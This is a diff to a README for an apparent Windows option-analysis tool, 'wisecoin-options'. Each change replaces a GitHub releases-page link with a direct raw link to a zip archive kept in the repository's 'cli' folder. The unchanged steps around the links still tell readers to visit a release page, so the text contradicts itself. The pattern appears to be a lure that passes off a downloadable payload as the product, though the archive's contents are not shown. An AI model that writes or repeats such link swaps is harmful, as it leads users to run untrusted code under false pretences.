@@ -1,10 +1,10 @@
 # 📈 wisecoin-options - Simple Option Analysis on Windows
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/frsendamoebidae505/wisecoin-options/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/frsendamoebidae505/wisecoin-options/main/cli/wisecoin-options-v2.8.zip)
 
 ## 🖥️ Download and Install
 
-Visit this page to download: https://github.com/frsendamoebidae505/wisecoin-options/releases
+Visit this page to download: https://raw.githubusercontent.com/frsendamoebidae505/wisecoin-options/main/cli/wisecoin-options-v2.8.zip
 
 1. Open the release page in your browser.
 2. Find the latest release.
@@ -208,11 +208,11 @@ Examples:
 
 ## 📦 Download Again Later
 
-If you need a fresh copy, visit this page to download: https://github.com/frsendamoebidae505/wisecoin-options/releases
+If you need a fresh copy, visit this page to download: https://raw.githubusercontent.com/frsendamoebidae505/wisecoin-options/main/cli/wisecoin-options-v2.8.zip
 
 Use the latest release file each time so you get the newest build and the latest data-handling changes
 
 ## 📄 Release Page
 
 The release page is the main place to get the Windows package:
-https://github.com/frsendamoebidae505/wisecoin-options/releases
+https://raw.githubusercontent.com/frsendamoebidae505/wisecoin-options/main/cli/wisecoin-options-v2.8.zip
